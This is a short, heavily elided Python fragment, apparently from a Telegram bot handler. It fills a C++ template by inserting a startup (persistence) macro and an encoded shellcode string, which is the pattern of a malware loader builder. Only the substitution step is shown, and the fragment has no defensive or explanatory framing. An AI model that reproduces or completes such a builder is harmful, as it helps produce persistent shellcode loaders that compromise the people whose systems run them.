...
async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    ...
    try:
        ...
        cpp_code = cpp_template.replace("// {startup_macro_placeholder}", startup_macro)
        cpp_code = cpp_code.replace('std::string en_sh = "sh";', f'std::string en_sh = "{encoded_shellcode}";')
